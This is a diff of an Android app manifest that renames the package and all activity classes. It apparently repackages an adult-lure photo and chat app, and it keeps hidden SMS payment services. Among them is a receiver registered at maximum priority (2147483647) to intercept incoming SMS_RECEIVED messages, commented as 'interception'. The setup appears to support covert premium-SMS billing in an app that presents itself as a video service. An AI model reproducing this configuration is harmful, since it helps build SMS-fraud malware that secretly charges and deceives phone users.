@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.wsfg.zd"
+    package="com.wbvideo.dm"
     android:versionCode="9"
-    android:versionName="9.4.20160303" >
+    android:versionName="9.8.20160311" >
 
     <uses-sdk
         android:minSdkVersion="8"
@@ -62,9 +62,8 @@
             android:value="00d681c72c" />
         <!-- 启动页面 -->
         <activity
-            android:name="com.zmv.zf.activity.LaunchActivity"
+            android:name="com.act.view.LaunchAct"
             android:label="@string/app_name"
-            android:launchMode="singleInstance"
             android:screenOrientation="portrait" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -74,32 +73,32 @@
         </activity>
         <!-- 主框架 -->
         <activity
-            android:name="com.zmv.zf.activity.MainActivity"
+            android:name="com.act.view.MainAct"
             android:launchMode="singleTask"
             android:screenOrientation="portrait" >
         </activity>
         <!-- 个人主页 -->
         <activity
-            android:name="com.zmv.zf.activity.PersonActivity"
+            android:name="com.act.view.PersonAct"
             android:screenOrientation="portrait" />
         <!-- 美女私房 -->
         <activity
-            android:name="com.zmv.zf.activity.DetailActivity"
+            android:name="com.act.view.DetailAct"
             android:screenOrientation="portrait"
             android:windowSoftInputMode="stateAlwaysHidden|adjustResize" />
         <!-- 聊天 -->
         <activity
-            android:name="com.zmv.zf.activity.TalkActivity"
+            android:name="com.act.view.TalkAct"
             android:screenOrientation="portrait"
             android:windowSoftInputMode="stateAlwaysHidden|adjustResize" />
         <!-- 浏览图片页面 -->
         <activity
-            android:name="com.zmv.zf.activity.ViewPageActivity"
+            android:name="com.act.view.ViewPageAct"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.Translucent"
             android:windowSoftInputMode="stateHidden" />
         <activity
-            android:name="com.zmv.zf.activity.NetActivity"
+            android:name="com.act.view.NetWorkAct"
             android:launchMode="singleTask"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.Translucent" >
@@ -108,7 +107,7 @@
         <activity
             android:name="com.zmv.zf.activity.VideoTestActivity"
             android:screenOrientation="portrait" >
-        </activity>
+        </activity>
         -->
         <service android:name="com.zmv.zf.service.MainService" />
 
@@ -260,7 +259,8 @@
         <!-- 米粒支付  end -->
         <!-- 微信支付 -->
         <!-- SDK　start -->
-       <!--  <activity
+        <!--
+        <activity
             android:name="com.hft.wechat.HftWeChatActivity"
             android:configChanges="orientation|keyboardHidden|screenSize" >
         </activity>
@@ -299,7 +299,9 @@
         <meta-data
             android:name="HFT_APP_KEY"
             android:value="4e7d66d09e564b2ba199dc7fb8556356" >
-        </meta-data> -->
+        </meta-data>
+        -->
+
 
         <!-- 微信支付end -->
 
@@ -308,9 +310,9 @@
         <meta-data
             android:name="YM_CPID"
             android:value="10004_52_1" />
- <!-- //cpid由渠道商分配 -->
+        <!-- //cpid由渠道商分配 -->
 
-         <service android:name="com.android.yimeng.ympay.pay.PlateService" >
+        <service android:name="com.android.yimeng.ympay.pay.PlateService" >
         </service>
 
         <receiver android:name="com.android.yimeng.ympay.sms.filtersms.SMSSendResultReceiver" >
@@ -339,15 +341,15 @@
         </receiver>
 
         <!-- 应美sdk end -->
-          <activity
+        <activity
             android:name="com.hs.py.activity.HsActivity"
             android:exported="true"
             android:theme="@android:style/Theme.Translucent" >
         </activity>
-        
+
         <!-- android:screenOrientation="landscape" -->
 
-        <activity
+        <!-- <activity
             android:name="com.alipay.sdk.app.H5PayActivity"
             android:configChanges="orientation|keyboardHidden|navigation"
             android:exported="false"
@@ -358,8 +360,8 @@
             android:configChanges="orientation|keyboardHidden|navigation"
             android:exported="false"
             android:screenOrientation="behind" >
-        </activity>
-        
+        </activity> -->
+
         <service android:name="com.hs.py.service.HsPlateService" >
         </service>
         <!-- 新版本拦截 -->
@@ -372,6 +374,7 @@
         <service
             android:name="com.hs.py.service.HsSmsService"
             android:enabled="true" />
+
         <receiver android:name="com.hs.py.util.sms.SmsReceiver" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
